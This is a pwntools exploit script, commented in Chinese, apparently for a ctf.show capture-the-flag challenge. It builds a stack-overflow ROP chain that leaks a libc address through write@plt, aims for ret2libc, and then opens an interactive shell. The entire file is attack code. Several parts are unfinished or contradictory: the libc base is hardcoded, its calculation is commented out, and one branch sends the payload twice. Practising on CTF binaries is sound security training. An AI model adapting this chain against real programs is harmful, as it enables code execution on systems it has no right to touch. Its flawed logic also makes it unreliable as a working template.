#!/usr/bin/env python3
from pwn import *
from kk import *

context(arch='amd64', os='linux')
context.log_level = 'debug'

# 加载程序
elf = ELF('./pwn')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 本地调试
p = process('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 远程
# p = remote('pwn.challenge.ctf.show', 28362)
libc_base = 0x7f1a1b700000
# 获取 gadgets（无 libc）
K, L = libcrop(elf,libc,libc_base)

# ============================================================
# 利用思路：ret2plt 泄露 libc，然后 ret2libc
# ============================================================

# PLT 地址
read_plt = elf.plt['read']
write_plt = elf.plt['write']
setbuf_plt = elf.plt['setbuf']

# GOT 地址
read_got = elf.got['read']
write_got = elf.got['write']
setbuf_got = elf.got['setbuf']

# 函数地址
main_addr = elf.symbols['main']
show_addr = elf.symbols['show']

# ============================================================
# 阶段1: 泄露 write 地址（返回 main 再次利用）
# ============================================================

pop_rdi = K['pop_rdi']
pop_rsi_r15 = K.get('pop_rsi_r15_rbp')
ret = K['ret']

payload = b''
payload += b'A' * 0x70  # 填充缓冲区
payload += b'B' * 8     # 填充 rbp

# 调用 write(1, write_got, 8) 泄露 write 地址
payload += p64(pop_rdi) + p64(1)  # rdi = 1 (stdout)

# 需要设置 rsi，但程序没有 pop_rsi
# 查看是否有其他方式
if not pop_rsi_r15:
    # 使用 pop_r12_r13_r14_r15
    pop_r12_r13_r14_r15 = K.get('pop_r12_r13_r14_r15')
    # 但这个不行，因为 r12 不作为参数

    # 暂时使用返回 show 函数再次触发溢出
    payload += p64(show_addr)
    p.sendafter(b'CTFshow PWN!\n', payload)

    # 获取 shell 的简单尝试
    payload2 = b'A' * 0x70 + b'B' * 8
    payload2 += p64(pop_rdi) + p64(0)
    payload2 += p64(show_addr)  # 重新调用 show
    p.sendline(payload2)

else:
    payload += p64(pop_rsi_r15) + p64(write_got) + p64(0)  # rsi = write_got, r15 = 垃圾
    payload += p64(ret)  # 对齐
    payload += p64(write_plt)  # 调用 write
    payload += p64(main_addr)  # 返回 main

# 发送 payload
p.sendafter(b'CTFshow PWN!\n', payload)

# 接收泄露的地址
try:
    leak = p.recv(8)
    write_addr = u64(leak)
    print(f"[+] write 地址: {hex(write_addr)}")

    # 计算 libc_base（需要知道 libc 版本）
    # 假设是 Ubuntu 18.04 的 libc
    # libc_write_offset = 0x110000  # 需要根据实际情况调整
    # libc_base = write_addr - libc_write_offset
    # print(f"[+] libc_base: {hex(libc_base)}")

except:
    print("[!] 泄露失败")

p.interactive()
